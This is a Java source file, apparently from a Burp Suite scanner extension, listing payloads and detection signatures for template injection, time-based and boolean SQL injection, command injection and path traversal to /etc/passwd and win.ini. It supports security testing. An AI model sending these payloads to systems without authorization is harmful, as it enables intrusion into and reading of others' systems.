package com.example.burpgemini.hunt;

/** Payload libraries and detection signatures for oracle-based active testing. */
public final class Payloads {

    private Payloads() {
    }

    /** SSTI math oracle — a hit reflects {@code 49}. */
    public static final String[] SSTI = {"{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}"};

    /** ~5s sleep payloads for time-based SQLi across engines. */
    public static final String[] SQLI_TIME = {
            "' OR SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -", "\" OR SLEEP(5)-- -",
            "' || pg_sleep(5)-- -", "') OR SLEEP(5)-- -", "1) OR SLEEP(5)-- -",
    };

    /** ~5s sleep payloads for time-based command injection. */
    public static final String[] CMDI_TIME = {
            "; sleep 5", "| sleep 5", "& ping -n 6 127.0.0.1 &", "$(sleep 5)", "`sleep 5`", "%0asleep 5",
    };

    public static final String[] SQLI_BOOL_TRUE = {"' OR '1'='1", "' OR 1=1-- -", "1 OR 1=1"};
    public static final String[] SQLI_BOOL_FALSE = {"' OR '1'='2", "' AND 1=2-- -", "1 AND 1=2"};

    public static final String[] SQLI_ERROR = {"'", "\"", "')", "';", "'\"", "' OR '", "\\"};

    public static final String[] PATH_TRAVERSAL = {
            "../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//....//etc/passwd", "../../../../../../windows/win.ini",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    };

    public static final String[] SQL_ERROR_SIGNS = {
            "SQL syntax", "mysql_fetch", "ORA-0", "SQLSTATE", "PostgreSQL", "syntax error at or near",
            "Microsoft OLE DB", "ODBC SQL", "Unclosed quotation mark", "SQLite3::", "org.hibernate",
            "MySqlException", "SqlException", "Warning: mysqli", "quoted string not properly terminated",
    };

    public static final String[] TRAVERSAL_SIGNS = {
            "root:x:0:0", "daemon:x:", "[extensions]", "; for 16-bit app support", "[fonts]",
    };

    /** Dangerous DOM/JS sinks worth flagging in client-side analysis. */
    public static final String[] JS_SINKS = {
            "innerHTML", "outerHTML", "document.write", "eval(", "setTimeout(\"", "setInterval(\"",
            "Function(", "location.href", "location.assign", "location.replace", "insertAdjacentHTML",
            "dangerouslySetInnerHTML", "srcdoc", ".html(", "$(location", "window.name",
    };
}
